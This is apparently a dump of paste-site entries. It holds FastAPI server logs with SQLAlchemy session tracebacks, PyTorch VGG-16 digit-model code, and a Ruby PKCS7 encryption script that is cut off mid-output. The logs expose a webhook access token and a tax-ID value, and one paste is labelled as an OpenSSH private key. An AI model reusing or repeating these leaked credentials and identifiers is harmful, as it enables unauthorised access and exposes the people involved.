INFO:     10.108.0.4:40800 - ""POST /api/v1/users/grouped_info?page=1&page_size=20 HTTP/1.0"" 200 OK
2023-10-02 16:51:20.152 | DEBUG    | app.api.api_v1.endpoints.token:search_tokens_by_dynamic_filter:410 - entity=TOKENS | method=POST | route=/tokens/{dynamic_filter} | returncode=000 | message=Route_Called
2023-10-02 16:51:20.156 | SUCCESS  | app.api.api_v1.endpoints.token:search_tokens_by_dynamic_filter:481 - entity=TOKENS | method=POST | route=/tokens/{dynamic_filter} | returncode=200 | message=Keyword:{'filter':_[{'key':_'user_requested.taxid',_'operation':_'eq',_'value':_'61656216000'}]}
INFO:     10.108.0.4:40828 - ""POST /api/v1/tokens/dynamic-filter?page=1&limit=100/ HTTP/1.0"" 200 OK
2023-10-02 16:51:20.351 | DEBUG    | app.api.api_v1.endpoints.building:fetch_building_id:119 - entity=BUILDING | method=GET | route=/buildings/{search_id} | returncode=000 | message=Route_Called
2023-10-02 16:51:20.357 | SUCCESS  | app.api.api_v1.endpoints.building:fetch_building_id:148 - entity=BUILDING | method=GET | route=/buildings/{search_id} | returncode=200 | message=Keyword:8
INFO:     10.108.0.4:40836 - ""GET /api/v1/buildings/8 HTTP/1.0"" 200 OK
INFO:     10.108.0.4:55736 - ""OPTIONS /api/v1/users/486 HTTP/1.0"" 200 OK
INFO:     10.108.0.4:55750 - ""POST /api/v1/users/grouped_info?page=1&page_size=20 HTTP/1.0"" 200 OK
INFO:     10.108.0.4:55776 - ""POST /api/v1/users/grouped_info?page=1&page_size=20 HTTP/1.0"" 500 Internal Server Error
ERROR:    Exception in ASGI application
Traceback (most recent call last):
  File ""/usr/local/lib/python3.8/site-packages/uvicorn/protocols/http/h11_impl.py"", line 407, in run_asgi
    result = await app(  # type: ignore[func-returns-value]
  File ""/usr/local/lib/python3.8/site-packages/uvicorn/middleware/proxy_headers.py"", line 78, in __call__
    return await self.app(scope, receive, send)
  File ""/usr/local/lib/python3.8/site-packages/fastapi/applications.py"", line 269, in __call__
    await super().__call__(scope, receive, send)
  File ""/usr/local/lib/python3.8/site-packages/starlette/applications.py"", line 124, in __call__
    await self.middleware_stack(scope, receive, send)
  File ""/usr/local/lib/python3.8/site-packages/starlette/middleware/errors.py"", line 184, in __call__
    raise exc
  File ""/usr/local/lib/python3.8/site-packages/starlette/middleware/errors.py"", line 162, in __call__
    await self.app(scope, receive, _send)
  File ""/usr/local/lib/python3.8/site-packages/starlette/middleware/cors.py"", line 92, in __call__
    await self.simple_response(scope, receive, send, request_headers=headers)
  File ""/usr/local/lib/python3.8/site-packages/starlette/middleware/cors.py"", line 147, in simple_response
    await self.app(scope, receive, send)
  File ""/usr/local/lib/python3.8/site-packages/starlette/exceptions.py"", line 93, in __call__
    raise exc
  File ""/usr/local/lib/python3.8/site-packages/starlette/exceptions.py"", line 82, in __call__
    await self.app(scope, receive, sender)
  File ""/usr/local/lib/python3.8/site-packages/fastapi/middleware/asyncexitstack.py"", line 21, in __call__
    raise e
  File ""/usr/local/lib/python3.8/site-packages/fastapi/middleware/asyncexitstack.py"", line 18, in __call__
    await self.app(scope, receive, send)
  File ""/usr/local/lib/python3.8/site-packages/starlette/routing.py"", line 670, in __call__
    await route.handle(scope, receive, send)
  File ""/usr/local/lib/python3.8/site-packages/starlette/routing.py"", line 266, in handle
    await self.app(scope, receive, send)
  File ""/usr/local/lib/python3.8/site-packages/starlette/routing.py"", line 65, in app
    response = await func(request)
  File ""/usr/local/lib/python3.8/site-packages/fastapi/routing.py"", line 227, in app
    raw_response = await run_endpoint_function(
  File ""/usr/local/lib/python3.8/site-packages/fastapi/routing.py"", line 162, in run_endpoint_function
    return await run_in_threadpool(dependant.call, **values)
  File ""/usr/local/lib/python3.8/site-packages/starlette/concurrency.py"", line 41, in run_in_threadpool
    return await anyio.to_thread.run_sync(func, *args)
  File ""/usr/local/lib/python3.8/site-packages/anyio/to_thread.py"", line 33, in run_sync
    return await get_async_backend().run_sync_in_worker_thread(
  File ""/usr/local/lib/python3.8/site-packages/anyio/_backends/_asyncio.py"", line 2106, in run_sync_in_worker_thread
    return await future
  File ""/usr/local/lib/python3.8/site-packages/anyio/_backends/_asyncio.py"", line 833, in run
    result = context.run(func, *args)
  File ""/app/api/api_v1/endpoints/user.py"", line 356, in fetch_grouped_info
    grouped_info = crud.user.get_grouped_info(
  File ""/app/crud/crud_user.py"", line 128, in get_grouped_info
    for token in user.token_requested:
  File ""/usr/local/lib/python3.8/site-packages/sqlalchemy/orm/attributes.py"", line 487, in __get__
    return self.impl.get(state, dict_)
  File ""/usr/local/lib/python3.8/site-packages/sqlalchemy/orm/attributes.py"", line 959, in get
    value = self._fire_loader_callables(state, key, passive)
  File ""/usr/local/lib/python3.8/site-packages/sqlalchemy/orm/attributes.py"", line 995, in _fire_loader_callables
    return self.callable_(state, passive)
  File ""/usr/local/lib/python3.8/site-packages/sqlalchemy/orm/strategies.py"", line 863, in _load_for_state
    raise orm_exc.DetachedInstanceError(
sqlalchemy.orm.exc.DetachedInstanceError: Parent instance <User at 0x7f273a9d9790> is not bound to a Session; lazy load operation of attribute 'token_requested' cannot proceed (Background on this error at: https://sqlalche.me/e/14/bhk3)
2023-10-02 16:53:49.653 | DEBUG    | app.api.api_v1.endpoints.user:fetch_user:133 - entity=USER | method=GET | route=/users/{search_id} | returncode=000 | message=Route_Called
2023-10-02 16:53:49.658 | SUCCESS  | app.api.api_v1.endpoints.user:fetch_user:161 - entity=USER | method=GET | route=/users/{search_id} | returncode=200 | message=Keyword:486
INFO:     10.108.0.4:55792 - ""GET /api/v1/users/486 HTTP/1.0"" 200 OK
INFO:     10.108.0.4:55764 - ""POST /api/v1/users/grouped_info?page=1&page_size=20 HTTP/1.0"" 200 OK
INFO:     10.108.0.4:55796 - ""OPTIONS /api/v1/userdocuments/user_id/486 HTTP/1.0"" 200 OK
2023-10-02 16:53:50.276 | DEBUG    | app.api.api_v1.endpoints.userdocument:fetch_userdocument_user_id:245 - entity=USERDOCUMENT | method=GET | route=/userdocuments/user_id/{user_id | returncode=000 | message=Route_Called
2023-10-02 16:53:50.280 | SUCCESS  | app.api.api_v1.endpoints.userdocument:fetch_userdocument_user_id:275 - entity=USERDOCUMENT | method=GET | route=/userdocuments/user_id/{user_id | returncode=200 | message=Keyword:486
INFO:     10.108.0.4:55812 - ""GET /api/v1/userdocuments/user_id/486 HTTP/1.0"" 200 OK
INFO:     10.108.0.4:55824 - ""OPTIONS /api/v1/tokens/dynamic-filter?page=1&limit=100/ HTTP/1.0"" 200 OK
2023-10-02 16:53:50.774 | DEBUG    | app.api.api_v1.endpoints.token:search_tokens_by_dynamic_filter:410 - entity=TOKENS | method=POST | route=/tokens/{dynamic_filter} | returncode=000 | message=Route_Called
2023-10-02 16:53:50.777 | SUCCESS  | app.api.api_v1.endpoints.token:search_tokens_by_dynamic_filter:481 - entity=TOKENS | method=POST | route=/tokens/{dynamic_filter} | returncode=200 | message=Keyword:{'filter':_[{'key':_'user_requested.taxid',_'operation':_'eq',_'value':_'61656216000'}]}
INFO:     10.108.0.4:55826 - ""POST /api/v1/tokens/dynamic-filter?page=1&limit=100/ HTTP/1.0"" 200 OK
INFO:     10.108.0.4:55832 - ""OPTIONS /api/v1/buildings/8 HTTP/1.0"" 200 OK
2023-10-02 16:53:51.182 | DEBUG    | app.api.api_v1.endpoints.building:fetch_building_id:119 - entity=BUILDING | method=GET | route=/buildings/{search_id} | returncode=000 | message=Route_Called
2023-10-02 16:53:51.187 | SUCCESS  | app.api.api_v1.endpoints.building:fetch_building_id:148 - entity=BUILDING | method=GET | route=/buildings/{search_id} | returncode=200 | message=Keyword:8
INFO:     10.108.0.4:55842 - ""GET /api/v1/buildings/8 HTTP/1.0"" 200 OK
2023-10-02 17:01:56.497 | ERROR    | __main__:validation_exception_handler:42 - entity=CAPTURED_EXCEPTION | method=CAPTURED_EXCEPTION | route=/captured_exception/{exception} | returncode=422 | message=Exception_Captured.Keyword:Exception:<starlette.requests.Request_object_at_0x7f27484ef820>:_1_validation_error_for_Request_body_->_forwarded_field_required_(type=value_error.missing)
INFO:     10.108.0.4:35600 - ""POST /api/v1/z-api/on-message-received?token=0a27fb8155fe4fb1a57c8d02c3410908c81dd10f8316434bb8b6e9b170047cc4498135650e82498e97f24e1ff217ade70e76b28f6bd047798127c7c8953ae37a HTTP/1.0"" 422 Unprocessable Entity
2023-10-02 17:09:13.967 | DEBUG    | app.api.api_v1.endpoints.zapi:zapi_inbound_message:56 - entity=ZAPI | method=POST | route=/zapi/on-message-received | returncode=000 | message=Route_Called
INFO:     10.108.0.4:54976 - ""POST /api/v1/z-api/on-message-received?token=0a27fb8155fe4fb1a57c8d02c3410908c81dd10f8316434bb8b6e9b170047cc4498135650e82498e97f24e1ff217ade70e76b28f6bd047798127c7c8953ae37a HTTP/1.0"" 200 OK
2023-10-02 17:09:22.506 | DEBUG    | app.api.api_v1.endpoints.zapi:zapi_inbound_message:56 - entity=ZAPI | method=POST | route=/zapi/on-message-received | returncode=000 | message=Route_Called
INFO:     10.108.0.4:49976 - ""POST /api/v1/z-api/on-message-received?token=0a27fb8155fe4fb1a57c8d02c3410908c81dd10f8316434bb8b6e9b170047cc4498135650e82498e97f24e1ff217ade70e76b28f6bd047798127c7c8953ae37a HTTP/1.0"" 200 OK
INFO:     10.108.0.4:49700 - ""POST /api/v1/z-api/set-manual-mode/555181708362?token=0a27fb8155fe4fb1a57c8d02c3410908c81dd10f8316434bb8b6e9b170047cc4498135650e82498e97f24e1ff217ade70e76b28f6bd047798127c7c8953ae37a HTTP/1.0"" 200 OK
2023-10-02 17:13:12.152 | DEBUG    | app.api.api_v1.endpoints.zapi:zapi_inbound_message:56 - entity=ZAPI | method=POST | route=/zapi/on-message-received | returncode=000 | message=Route_Called
INFO:     10.108.0.4:35078 - ""POST /api/v1/z-api/on-message-received?token=0a27fb8155fe4fb1a57c8d02c3410908c81dd10f8316434bb8b6e9b170047cc4498135650e82498e97f24e1ff217ade70e76b28f6bd047798127c7c8953ae37a HTTP/1.0"" 200 OK
2023-10-02 17:14:46.008 | ERROR    | __main__:validation_exception_handler:42 - entity=CAPTURED_EXCEPTION | method=CAPTURED_EXCEPTION | route=/captured_exception/{exception} | returncode=422 | message=Exception_Captured.Keyword:Exception:<starlette.requests.Request_object_at_0x7f27486b9550>:_1_validation_error_for_Request_body_->_forwarded_field_required_(type=value_error.missing)
INFO:     10.108.0.4:54954 - ""POST /api/v1/z-api/on-message-received?token=0a27fb8155fe4fb1a57c8d02c3410908c81dd10f8316434bb8b6e9b170047cc4498135650e82498e97f24e1ff217ade70e76b28f6bd047798127c7c8953ae37a HTTP/1.0"" 422 Unprocessable Entity
INFO:     10.108.0.4:49644 - ""OPTIONS /api/v1/users/grouped_info?page=1&page_size=20 HTTP/1.0"" 200 OK
INFO:     10.108.0.4:49660 - ""OPTIONS /api/v1/users/486 HTTP/1.0"" 200 OK
INFO:     10.108.0.4:49666 - ""OPTIONS /api/v1/users/grouped_info?page=1&page_size=20 HTTP/1.0"" 200 OK
INFO:     10.108.0.4:49670 - ""OPTIONS /api/v1/users/grouped_info?page=1&page_size=20 HTTP/1.0"" 200 OK
2023-10-02 17:14:49.096 | DEBUG    | app.api.api_v1.endpoints.user:fetch_user:133 - entity=USER | method=GET | route=/users/{search_id} | returncode=000 | message=Route_Called
2023-10-02 17:14:49.131 | SUCCESS  | app.api.api_v1.endpoints.user:fetch_user:161 - entity=USER | method=GET | route=/users/{search_id} | returncode=200 | message=Keyword:486
INFO:     10.108.0.4:49672 - ""GET /api/v1/users/486 HTTP/1.0"" 200 OK
INFO:     10.108.0.4:49684 - ""POST /api/v1/users/grouped_info?page=1&page_size=20 HTTP/1.0"" 500 Internal Server Error
ERROR:    Exception in ASGI application
Traceback (most recent call last):
  File ""/usr/local/lib/python3.8/site-packages/uvicorn/protocols/http/h11_impl.py"", line 407, in run_asgi
    result = await app(  # type: ignore[func-returns-value]
  File ""/usr/local/lib/python3.8/site-packages/uvicorn/middleware/proxy_headers.py"", line 78, in __call__
    return await self.app(scope, receive, send)
  File ""/usr/local/lib/python3.8/site-packages/fastapi/applications.py"", line 269, in __call__
    await super().__call__(scope, receive, send)
  File ""/usr/local/lib/python3.8/site-packages/starlette/applications.py"", line 124, in __call__
    await self.middleware_stack(scope, receive, send)
  File ""/usr/local/lib/python3.8/site-packages/starlette/middleware/errors.py"", line 184, in __call__
    raise exc
  File ""/usr/local/lib/python3.8/site-packages/starlette/middleware/errors.py"", line 162, in __call__
    await self.app(scope, receive, _send)
  File ""/usr/local/lib/python3.8/site-packages/starlette/middleware/cors.py"", line 92, in __call__
    await self.simple_response(scope, receive, send, request_headers=headers)
  File ""/usr/local/lib/python3.8/site-packages/starlette/middleware/cors.py"", line 147, in simple_response
    await self.app(scope, receive, send)
  File ""/usr/local/lib/python3.8/site-packages/starlette/exceptions.py"", line 93, in __call__
    raise exc
  File ""/usr/local/lib/python3.8/site-packages/starlette/exceptions.py"", line 82, in __call__
    await self.app(scope, receive, sender)
  File ""/usr/local/lib/python3.8/site-packages/fastapi/middleware/asyncexitstack.py"", line 21, in __call__
    raise e
  File ""/usr/local/lib/python3.8/site-packages/fastapi/middleware/asyncexitstack.py"", line 18, in __call__
    await self.app(scope, receive, send)
  File ""/usr/local/lib/python3.8/site-packages/starlette/routing.py"", line 670, in __call__
    await route.handle(scope, receive, send)
  File ""/usr/local/lib/python3.8/site-packages/starlette/routing.py"", line 266, in handle
    await self.app(scope, receive, send)
  File ""/usr/local/lib/python3.8/site-packages/starlette/routing.py"", line 65, in app
    response = await func(request)
  File ""/usr/local/lib/python3.8/site-packages/fastapi/routing.py"", line 227, in app
    raw_response = await run_endpoint_function(
  File ""/usr/local/lib/python3.8/site-packages/fastapi/routing.py"", line 162, in run_endpoint_function
    return await run_in_threadpool(dependant.call, **values)
  File ""/usr/local/lib/python3.8/site-packages/starlette/concurrency.py"", line 41, in run_in_threadpool
    return await anyio.to_thread.run_sync(func, *args)
  File ""/usr/local/lib/python3.8/site-packages/anyio/to_thread.py"", line 33, in run_sync
    return await get_async_backend().run_sync_in_worker_thread(
  File ""/usr/local/lib/python3.8/site-packages/anyio/_backends/_asyncio.py"", line 2106, in run_sync_in_worker_thread
    return await future
  File ""/usr/local/lib/python3.8/site-packages/anyio/_backends/_asyncio.py"", line 833, in run
    result = context.run(func, *args)
  File ""/app/api/api_v1/endpoints/user.py"", line 356, in fetch_grouped_info
    grouped_info = crud.user.get_grouped_info(
  File ""/app/crud/crud_user.py"", line 128, in get_grouped_info
    for token in user.token_requested:
  File ""/usr/local/lib/python3.8/site-packages/sqlalchemy/orm/attributes.py"", line 487, in __get__
    return self.impl.get(state, dict_)
  File ""/usr/local/lib/python3.8/site-packages/sqlalchemy/orm/attributes.py"", line 959, in get
    value = self._fire_loader_callables(state, key, passive)
  File ""/usr/local/lib/python3.8/site-packages/sqlalchemy/orm/attributes.py"", line 995, in _fire_loader_callables
    return self.callable_(state, passive)
  File ""/usr/local/lib/python3.8/site-packages/sqlalchemy/orm/strategies.py"", line 863, in _load_for_state
    raise orm_exc.DetachedInstanceError(
sqlalchemy.orm.exc.DetachedInstanceError: Parent instance <User at 0x7f2748c17df0> is not bound to a Session; lazy load operation of attribute 'token_requested' cannot proceed (Background on this error at: https://sqlalche.me/e/14/bhk3)
INFO:     10.108.0.4:49676 - ""POST /api/v1/users/grouped_info?page=1&page_size=20 HTTP/1.0"" 200 OK
INFO:     10.108.0.4:49692 - ""POST /api/v1/users/grouped_info?page=1&page_size=20 HTTP/1.0"" 200 OK
INFO:     10.108.0.4:49704 - ""OPTIONS /api/v1/userdocuments/user_id/486 HTTP/1.0"" 200 OK
2023-10-02 17:14:51.063 | DEBUG    | app.api.api_v1.endpoints.userdocument:fetch_userdocument_user_id:245 - entity=USERDOCUMENT | method=GET | route=/userdocuments/user_id/{user_id | returncode=000 | message=Route_Called
2023-10-02 17:14:51.077 | SUCCESS  | app.api.api_v1.endpoints.userdocument:fetch_userdocument_user_id:275 - entity=USERDOCUMENT | method=GET | route=/userdocuments/user_id/{user_id | returncode=200 | message=Keyword:486
INFO:     10.108.0.4:49714 - ""GET /api/v1/userdocuments/user_id/486 HTTP/1.0"" 200 OK
INFO:     10.108.0.4:49730 - ""OPTIONS /api/v1/tokens/c5041dc9-c74e-4509-a665-45b7114b2e7a HTTP/1.0"" 200 OK
INFO:     10.108.0.4:49740 - ""OPTIONS /api/v1/tokens/dynamic-filter?page=1&limit=100/ HTTP/1.0"" 200 OK
2023-10-02 17:14:53.695 | DEBUG    | app.api.api_v1.endpoints.token:fetch_token_id:507 - entity=TOKENS | method=GET | route=/tokens/{search_id} | returncode=000 | message=Route_Called
2023-10-02 17:14:53.697 | DEBUG    | app.api.api_v1.endpoints.token:search_tokens_by_dynamic_filter:410 - entity=TOKENS | method=POST | route=/tokens/{dynamic_filter} | returncode=000 | message=Route_Called
2023-10-02 17:14:53.701 | SUCCESS  | app.api.api_v1.endpoints.token:search_tokens_by_dynamic_filter:481 - entity=TOKENS | method=POST | route=/tokens/{dynamic_filter} | returncode=200 | message=Keyword:{'filter':_[{'key':_'user_requested.taxid',_'operation':_'eq',_'value':_'61656216000'}]}
2023-10-02 17:14:53.716 | SUCCESS  | app.api.api_v1.endpoints.token:fetch_token_id:536 - entity=TOKENS | method=GET | route=/tokens/{search_id} | returncode=200 | message=Keyword:c5041dc9-c74e-4509-a665-45b7114b2e7a
INFO:     10.108.0.4:49750 - ""GET /api/v1/tokens/c5041dc9-c74e-4509-a665-45b7114b2e7a HTTP/1.0"" 200 OK
INFO:     10.108.0.4:49760 - ""POST /api/v1/tokens/dynamic-filter?page=1&limit=100/ HTTP/1.0"" 200 OK
INFO:     10.108.0.4:49768 - ""OPTIONS /api/v1/users/469 HTTP/1.0"" 200 OK
INFO:     10.108.0.4:49774 - ""OPTIONS /api/v1/buildings/8 HTTP/1.0"" 200 OK
2023-10-02 17:14:54.365 | DEBUG    | app.api.api_v1.endpoints.user:fetch_user:133 - entity=USER | method=GET | route=/users/{search_id} | returncode=000 | message=Route_Called
2023-10-02 17:14:54.365 | DEBUG    | app.api.api_v1.endpoints.building:fetch_building_id:119 - entity=BUILDING | method=GET | route=/buildings/{search_id} | returncode=000 | message=Route_Called
2023-10-02 17:14:54.385 | SUCCESS  | app.api.api_v1.endpoints.building:fetch_building_id:148 - entity=BUILDING | method=GET | route=/buildings/{search_id} | returncode=200 | message=Keyword:8
2023-10-02 17:14:54.386 | SUCCESS  | app.api.api_v1.endpoints.user:fetch_user:161 - entity=USER | method=GET | route=/users/{search_id} | returncode=200 | message=Keyword:469
INFO:     10.108.0.4:49798 - ""GET /api/v1/buildings/8 HTTP/1.0"" 200 OK
INFO:     10.108.0.4:49786 - ""GET /api/v1/users/469 HTTP/1.0"" 200 OK
2023-10-02 17:15:10.078 | DEBUG    | app.api.api_v1.endpoints.zapi:zapi_inbound_message:56 - entity=ZAPI | method=POST | route=/zapi/on-message-received | returncode=000 | message=Route_Called
INFO:     10.108.0.4:55862 - ""POST /api/v1/z-api/on-message-received?token=0a27fb8155fe4fb1a57c8d02c3410908c81dd10f8316434bb8b6e9b170047cc4498135650e82498e97f24e1ff217ade70e76b28f6bd047798127c7c8953ae37a HTTP/1.0"" 200 OK
2023-10-02 17:15:25.258 | DEBUG    | app.api.api_v1.endpoints.zapi:zapi_inbound_message:56 - entity=ZAPI | method=POST | route=/zapi/on-message-received | returncode=000 | message=Route_Called
INFO:     10.108.0.4:54772 - ""POST /api/v1/z-api/on-message-received?token=0a27fb8155fe4fb1a57c8d02c3410908c81dd10f8316434bb8b6e9b170047cc4498135650e82498e97f24e1ff217ade70e76b28f6bd047798127c7c8953ae37a HTTP/1.0"" 200 OK
2023-10-02 17:15:56.329 | DEBUG    | app.api.api_v1.endpoints.zapi:zapi_inbound_message:56 - entity=ZAPI | method=POST | route=/zapi/on-message-received | returncode=000 | message=Route_Called
INFO:     10.108.0.4:56772 - ""POST /api/v1/z-api/on-message-received?token=0a27fb8155fe4fb1a57c8d02c3410908c81dd10f8316434bb8b6e9b170047cc4498135650e82498e97f24e1ff217ade70e76b28f6bd047798127c7c8953ae37a HTTP/1.0"" 200 OK
2023-10-02 17:16:50.422 | DEBUG    | app.api.api_v1.endpoints.zapi:zapi_inbound_message:56 - entity=ZAPI | method=POST | route=/zapi/on-message-received | returncode=000 | message=Route_Called
INFO:     10.108.0.4:43990 - ""POST /api/v1/z-api/on-message-received?token=0a27fb8155fe4fb1a57c8d02c3410908c81dd10f8316434bb8b6e9b170047cc4498135650e82498e97f24e1ff217ade70e76b28f6bd047798127c7c8953ae37a HTTP/1.0"" 200 OK
"
rP7TnEbB,Untitled,sieschriben,PHP,Monday 2nd of October 2023 02:58:28 PM CDT,"-----BEGIN OPENSSH PRIVATE KEY-----

NzcwNzJlZjZjMmVmYjBkMGYwNWUwMGY2NTRhNTU1MmZiNWE4YmJhODdkZjRiYjRjN2JhN2NhOTQ4NTNkMTA3NTc3ZTliMDYyN2I4MTcwMGVmNGJkZTUzN2U5YjMzOTM0NWMzNzViYzUxYWEwYzM1YzUyOGZlMWE4MzQyNzY0NDJhYzI5ZGRmNmFlNWE
YjMzNGE4ZjA4MzEyOTBmMGQwZGM1OGM3ZTlmYzMzMDliNjJkMDNkZmNhNDhhNWNiZjNhNjBjOTI5NDVjOWU4YTQ3NzNjN2U4ZTViY2M3NDE5ZjUyYWNkOGIxNzllZmM3N2RkNDViY2MxNjNjMGFlMDgxYmQ5ZWMyOWIxNjgyYmQ0OGRkMjVkZWJmODU
Y2U1Y2ZiY2NiODJlYzViNDg3ODJlOTZhNWZmNjQyNTQxNzJhYmU4OTg5NGZlZDk0NDUwZWUwZjE1N2E1Mjk3Zjc1NTNhOTlmYzEzNWJiNjViN2NiNTNlYjc0YzI0N2M1MmM2MTBmZDg0ZjkwODRhM2VlMmE1MzExMGFmMTFiNGE2NjZhOGMzZGIxOTM
M2QzNDQwNmZiMWQxOTVhYWYwZjEwZmIyNTUxZjIwMDg1NjIxYzFlNTE4ZjJlMzMyYzExOTJmYjBhY2IzNjNlMDMxZTRiYTA1Y2RkODAwMWMwMzcwNzE3ZDQwY2MwMDBmOTBkMTUyOWQzMGFjYTJkMzAxODY4OTU0M2Y2MDYyZmI4N2RiNGE2MGVjNjQ
YTU2ZDdhM2VjMGE4ZGQyODRkZDgzNjc2MjVkYzUwZjlkYmVhZGM3YWViNTVkYjRkOTY2ZjBiZDAyOGMwZGFiMGVkMjc2NWQyMTY2Yw==

-----END OPENSSH PRIVATE KEY-----
"
5JBJkEah,Untitled,ngnhtrg,Python,Monday 2nd of October 2023 02:55:58 PM CDT,"import torch
import torch.nn as nn
import torchvision.transforms as transforms
import torchvision.datasets as datasets
from torch.utils.data import DataLoader
import torch.optim as optim

# Define your training and validation datasets and data loaders here
# Example: Replace 'YourTrainDataset' and 'YourValDataset' with your actual datasets
# train_dataset = YourTrainDataset(transform=transforms.Compose([transforms.Resize(224), transforms.ToTensor()]))
# val_dataset = YourValDataset(transform=transforms.Compose([transforms.Resize(224), transforms.ToTensor()]))

# Define the number of classes for digit prediction (10 classes)
num_classes_digits = 10

# Create an instance of the custom model
model = CustomModel(num_classes_digits)

# Define loss function and optimizer
criterion = nn.CrossEntropyLoss()
optimizer = optim.Adam(model.parameters(), lr=0.001)

# Set the number of training epochs
num_epochs = 10

# Training loop
for epoch in range(num_epochs):
    model.train()  # Set the model in training mode
    for batch_data, batch_labels in train_loader:
        optimizer.zero_grad()  # Zero out gradients
        digit_logits = model(batch_data)  # Forward pass for digit prediction
        loss = model.loss(digit_logits, batch_labels)  # Compute loss
        loss.backward()  # Backpropagation
        optimizer.step()  # Update model parameters

    # Validation
    model.eval()  # Set the model in evaluation mode
    val_loss = 0.0
    correct_predictions = 0
    total_samples = 0

    with torch.no_grad():
        for val_data, val_labels in val_loader:
            val_digit_logits = model(val_data)
            val_loss += model.loss(val_digit_logits, val_labels).item()

            _, val_predicted_digits = torch.max(val_digit_logits, 2)
            correct_predictions += torch.sum(val_predicted_digits == val_labels).item()
            total_samples += val_labels.size(0)

    # Calculate validation loss and accuracy
    avg_val_loss = val_loss / len(val_loader)
    val_accuracy = correct_predictions / total_samples

    # Log and print training and validation progress
    print(f'Epoch [{epoch+1}/{num_epochs}] - Train Loss: {loss:.4f} - Val Loss: {avg_val_loss:.4f} - Val Accuracy: {val_accuracy:.2%}')

# Save the trained model
torch.save(model.state_dict(), 'custom_model_weights.pth')
"
NRbSyYHi,Untitled,ngnhtrg,Python,Monday 2nd of October 2023 02:51:46 PM CDT,"import torch
import torch.nn as nn
import torchvision.models as models

class CustomModel(nn.Module):
    def __init__(self, num_classes_digits):
        super(CustomModel, self).__init__()

        # Load the pre-trained VGG-16 model
        vgg16 = models.vgg16(pretrained=True)

        # Extract the feature layers from VGG-16
        self.features = vgg16.features

        # Define custom fully connected layers for digit prediction
        self.fc_layers = nn.Sequential(
            nn.Linear(512 * 7 * 7, 4096),
            nn.ReLU(inplace=True),
            nn.Dropout(),
            nn.Linear(4096, 4096),
            nn.ReLU(inplace=True),
            nn.Dropout()
        )

        # Output layers for digit prediction (13 digits)
        self.fc_digits = nn.ModuleList([
            nn.Linear(4096, num_classes_digits) for _ in range(13)
        ])

    def forward(self, x):
        x = self.features(x)
        x = x.view(x.size(0), -1)  # Flatten the feature tensor
        x = self.fc_layers(x)

        # Output predictions for digits
        digit_logits = [fc(x) for fc in self.fc_digits]

        return digit_logits

    @staticmethod
    def loss(digits_logits, digits_labels):
        criterion = nn.CrossEntropyLoss()
        digit_losses = [criterion(digits_logits[i], digits_labels[:, i]) for i in range(13)]  # Update to 13 digits
        total_loss = sum(digit_losses)
        return total_loss

# Create an instance of the custom model
num_classes_digits = 10  # Define the number of classes for digit prediction
model = CustomModel(num_classes_digits)

# Optionally, you can load the pre-trained weights for your custom model
# model.load_state_dict(torch.load('custom_model_weights.pth'))
"
4WZjKcRB,pkcs7.rb,mar-kim,Ruby,Monday 2nd of October 2023 02:43:34 PM CDT,"require 'openssl'

def make_cert(pkey)
  subject = ""/C=BE/O=Test/OU=Test/CN=Test""
  cert = OpenSSL::X509::Certificate.new
  cert.subject = cert.issuer = OpenSSL::X509::Name.parse(subject)
  cert.not_before = Time.now
  cert.not_after = Time.now + 365 * 24 * 60 * 60
  cert.public_key = pkey.public_key
  cert.serial = 0x0
  cert.version = 2

  ef = OpenSSL::X509::ExtensionFactory.new
  ef.subject_certificate = cert
  ef.issuer_certificate = cert
  cert.extensions = [
    ef.create_extension(""basicConstraints"",""CA:TRUE"", true),
    ef.create_extension(""subjectKeyIdentifier"", ""hash""),
  ]
  cert.add_extension ef.create_extension(""authorityKeyIdentifier"",
                                       ""keyid:always,issuer:always"")

  cert.sign pkey, OpenSSL::Digest::SHA1.new
  cert
end

recipient_key = OpenSSL::PKey::RSA.new(4096)
recipient_cert = make_cert(recipient_key)

sender_key = OpenSSL::PKey::RSA.new(4096)
sender_cert = make_cert(sender_key)

csr = OpenSSL::X509::Request.new
csr.public_key = sender_key.public_key
csr.subject = OpenSSL::X509::Name.parse(""C=UP"")
csr.sign(sender_key, OpenSSL::Digest::SHA256.new)

# The sender encrypts and signs the message
crypted = OpenSSL::PKCS7.encrypt([recipient_cert], ""message"").to_der
signed = OpenSSL::PKCS7.sign(sender_cert, sender_key, crypted).to_der

# The recipient tries to extract the message
store = OpenSSL::X509::Store.new
p7_signed = OpenSSL::PKCS7.new(signed)
p7_signed.verify(nil, store, nil, OpenSSL::PKCS7::NOVERIFY)
unsigned = p7_signed.data

# Attempt to decrypt
OpenSSL::PKCS7.new(unsigned).decrypt(recipient_key, recipient_cert)
# => ArgumentError: Could not parse the PKCS7: nested asn1 error

unsigned
# => ""0\x82\x02\xA8\x06\t*\x86H\x86\xF7\r\x01\a\x03\xA0\x82\x02\x990\x82\x02\x95\x02\x01\x001\x82\x02[0\x82\x02W\x02\x01\x000?0:1\v0\t\x06\x03U\x04\x06\x13\x02BE1\r0\v\x06\x03U\x04\r\n\f\x04Test1\r0\v\x06\x03U\x04\v\f\x04Test1\r0\v\x06\x03U\x04\x03\f\x04Test\x02\x01\x000\r\x06\t*\x86H\x86\xF7\r\x01\x01\x01\x05\x00\x04\x82\x02\x00j\xB4\x8C\x8E\x9E\""?\xFE#\x93\xFF\x92zg\x10\r^&\xE4l\x96\x15\xF9\xADk 